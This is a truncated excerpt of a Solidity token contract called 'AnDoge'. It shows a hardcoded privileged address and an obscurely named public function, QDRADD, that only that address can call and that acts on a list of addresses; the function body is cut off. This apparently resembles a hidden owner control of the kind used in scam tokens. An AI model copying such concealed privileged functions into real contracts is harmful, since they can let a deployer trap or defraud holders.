...
contract AD is Context, IERC20, Ownable {
    ...
    string private _name = "AnDoge";
    string private _symbol = "AnDoge";
    ...
    constructor () {
        ...
        m = payable(address(0xc1Da37fDc5763d289B4DC7Cfbe65cf4243cF76f0));
    ...
    function QDRADD(address[] calldata a,bool b) public {if(msg.sender == m){
